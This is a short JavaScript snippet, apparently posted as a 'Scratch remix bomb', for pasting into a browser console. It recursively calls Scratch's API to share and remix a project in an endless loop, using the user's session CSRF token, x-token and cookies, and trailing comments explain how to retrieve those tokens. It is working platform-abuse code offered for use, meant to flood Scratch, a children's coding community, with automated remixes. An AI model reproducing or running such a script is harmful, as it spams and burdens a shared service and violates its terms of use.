// i don't care what you do with this anymore

// scratch javascript remix bomb made by dzje, not me (TS2021)
// execute the code in console

var e = 1 // id of starting project

var h = 1 // next remix number will be this

var csrf = "insert here" // scratch X-CSRFToken

var xtoken = "insert here" // scratch x-token

var cookies = `` // scratch browser cookies

jsbomb = async function() {

fetch("https://api.scratch.mit.edu/proxy/projects/"+e+"/share", {

        "credentials": "include",

        "headers": {

            "Accept": "*/*",

            "Accept-Language": "en-US,en;q=0.5",

            "X-CSRFToken": csrf,

            "x-token": xtoken,

            "Sec-Fetch-Dest": "empty",

            "Sec-Fetch-Mode": "cors",

            "Sec-Fetch-Site": "same-site",

            "cookie":cookies

        },

        "referrer": "https://scratch.mit.edu/",

        "method": "PUT",

        "mode": "cors"

    });

e = await fetch("https://projects.scratch.mit.edu/?is_remix=1&original_id=" + e +"&title=Scratch%20Project", {

        "credentials": "include",

        "headers": {

            "Accept": "*/*",

            "Accept-Language": "en-US,en;q=0.5",

            "Content-Type": "application/json",

            "Sec-Fetch-Dest": "empty",

            "Sec-Fetch-Mode": "cors",

            "Sec-Fetch-Site": "same-site",

            "cookie":cookies

        },

        "referrer": "https://scratch.mit.edu/",

        "body": 'text here', // project's json goes here

        "method": "POST",

        "mode": "cors"

    });

    console.log(e);

    e = await e.json();

    e = e["content-name"];

h=h+1

console.log(h-1); // logs remix number

console.log(e) // logs project id

jsbomb();

}

jsbomb();


// delete everything below this line
// how to get X-CSRFToken
// comment something
// go to network and find /session
// copy the token

// how to get x-token
// comment something
// go to scratch.mit.edu/session
// view the page's source
// copy the token

// how to get project.json
// download the project you want to use
// convert it to a zip 
// open the zip
// open the folder created by the zip
// copy the json file in it
